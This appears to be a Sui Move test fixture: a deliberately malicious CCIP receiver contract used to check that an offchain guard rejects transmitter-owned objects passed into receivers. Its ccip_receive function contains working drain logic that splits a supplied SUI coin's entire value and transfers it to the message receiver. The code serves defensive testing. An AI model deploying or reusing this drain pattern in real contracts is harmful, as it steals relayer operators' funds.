/// TEST-ONLY receiver that demonstrates the confused-deputy drain the offchain
/// transmitter-ownership guard defends against. Not for production.
///
/// `ccip_receive` declares an extra `&mut Coin<SUI>` tail slot. A sender names a
/// transmitter-owned SUI gas coin in `receiverObjectIds`; without the guard the relayer
/// would wire that coin in under the transmitter's signature and this body would drain it.
/// The guard rejects transmitter-owned tail objects before they reach this function, so under
/// guarded execution the receiver leg is skipped and this body never runs.
module ccip_malicious_receiver::malicious_receiver;

use ccip::client;
use ccip::offramp_state_helper as osh;
use ccip::publisher_wrapper;
use ccip::receiver_registry;
use ccip::state_object::CCIPObjectRef;
use std::string::{Self, String};
use sui::clock::Clock;
use sui::coin::{Self, Coin};
use sui::dynamic_field as df;
use sui::event;
use sui::package::{Self, Publisher};

const EMessageIdMismatch: u64 = 0;

/// One-time witness for package publish. Consumed in `init`.
public struct MALICIOUS_RECEIVER has drop {}

/// Admin capability for registration. Stored by the deployer; not passed to `ccip_receive`.
public struct OwnerCap has key, store {
    id: UID,
    receiver_address: address,
}

public struct ReceivedMessage has copy, drop {
    message_id: vector<u8>,
    source_chain_selector: u64,
    sender: vector<u8>,
    data: vector<u8>,
    dest_token_transfer_length: u64,
    dest_token_amounts: vector<TokenAmount>,
}

/// Singleton delivery state. Created once in `init`; `has key` only so this module retains
/// transfer and share control.
public struct CCIPReceiverState has key {
    id: UID,
    counter: u64,
    message_id: vector<u8>,
    source_chain_selector: u64,
    sender: vector<u8>,
    data: vector<u8>,
    message_receiver: address,
    token_receiver: address,
    dest_token_transfer_length: u64,
    dest_token_amounts: vector<TokenAmount>,
}

/// Type proof for `receiver_registry` and `consume_any2sui_message`.
public struct MaliciousReceiverProof has drop {}

public struct PublisherKey has copy, drop, store {}

public struct TokenAmount has copy, drop, store {
    token: address,
    amount: u256,
}

public fun type_and_version(): String {
    string::utf8(b"MaliciousReceiver 1.0.0")
}

fun init(otw: MALICIOUS_RECEIVER, ctx: &mut TxContext) {
    let state = CCIPReceiverState {
        id: object::new(ctx),
        counter: 0,
        message_id: vector[],
        source_chain_selector: 0,
        sender: vector[],
        data: vector[],
        message_receiver: @0x0,
        token_receiver: @0x0,
        dest_token_transfer_length: 0,
        dest_token_amounts: vector[],
    };

    let mut owner_cap = OwnerCap {
        id: object::new(ctx),
        receiver_address: object::id_to_address(object::borrow_id(&state)),
    };

    let publisher = package::claim(otw, ctx);
    df::add(&mut owner_cap.id, PublisherKey {}, publisher);

    transfer::share_object(state);
    transfer::transfer(owner_cap, ctx.sender());
}

/// Registers this package in the OffRamp receiver registry.
public fun register_receiver(owner_cap: &OwnerCap, ref: &mut CCIPObjectRef) {
    let publisher: &Publisher = df::borrow(&owner_cap.id, PublisherKey {});
    let publisher_wrapper = publisher_wrapper::create(publisher, MaliciousReceiverProof {});
    receiver_registry::register_receiver(ref, publisher_wrapper, MaliciousReceiverProof {});
}

public fun get_counter(state: &CCIPReceiverState): u64 {
    state.counter
}

/// CCIP entrypoint. The `drain_coin` tail slot is the exploit surface: a transmitter-owned
/// SUI coin named in `receiverObjectIds` would be handed in here as `&mut Coin<sui::sui::SUI>` under the
/// transmitter's signature. The body drains it to the message receiver. The offchain guard
/// skips this receiver leg before that can happen, so guarded execution never calls this.
public fun ccip_receive(
    expected_message_id: vector<u8>,
    ref: &CCIPObjectRef,
    message: client::Any2SuiMessage,
    clock: &Clock,
    state: &mut CCIPReceiverState,
    drain_coin: &mut Coin<sui::sui::SUI>,
    ctx: &mut TxContext,
) {
    clock;

    let (
        message_id,
        source_chain_selector,
        sender,
        data,
        message_receiver,
        token_receiver,
        dest_token_amounts,
    ) = osh::consume_any2sui_message(ref, message, MaliciousReceiverProof {});

    assert!(message_id == expected_message_id, EMessageIdMismatch);

    // Exploit: drain the address-owned SUI coin supplied as a tail object. coin::split takes
    // &mut Coin<T> (unlike coin::take, which needs a Balance) and returns the split-off coin.
    let stolen = coin::split(drain_coin, coin::value(drain_coin), ctx);
    transfer::public_transfer(stolen, message_receiver);

    state.counter = state.counter + 1;
    state.message_id = message_id;
    state.source_chain_selector = source_chain_selector;
    state.sender = sender;
    state.data = data;
    state.message_receiver = message_receiver;
    state.token_receiver = token_receiver;
    state.dest_token_transfer_length = dest_token_amounts.length() as u64;
    state.dest_token_amounts = vector[];

    let mut i = 0;
    while (i < state.dest_token_transfer_length) {
        let (token, amount) = client::get_token_and_amount(&dest_token_amounts[i]);
        state.dest_token_amounts.push_back(TokenAmount { token, amount });
        i = i + 1;
    };

    event::emit(ReceivedMessage {
        message_id,
        source_chain_selector,
        sender,
        data,
        dest_token_transfer_length: state.dest_token_transfer_length,
        dest_token_amounts: state.dest_token_amounts,
    });
}
